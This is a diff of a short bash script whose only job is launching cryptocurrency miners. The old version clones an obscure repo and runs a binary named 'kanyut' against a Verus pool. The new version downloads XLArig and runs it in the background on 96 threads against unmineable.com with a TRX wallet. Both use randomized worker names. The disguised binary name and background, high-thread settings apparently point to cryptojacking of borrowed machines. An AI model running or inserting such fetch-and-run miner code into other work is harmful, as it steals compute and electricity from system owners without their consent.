@@ -1,5 +1,2 @@
 #!/usr/bin/env bash
-git clone https://gitlab.com/kikibena365/ikan.git
-cd ikan
-chmod +x kanyut 
-./kanyut -v -l na.luckpool.net:3956 -u RAW7HNDKqZARZKW9rLLPchhMkuwBfc85qD.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -p x -t 96
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx-us.unmineable.com:3333 -u TRX:TJ64St91EUFbaDg3T2zKq8iYZ4MSk88vBU.$(echo $(shuf -i 1-99999 -n 1)-Tytyd) -k -t96 -B
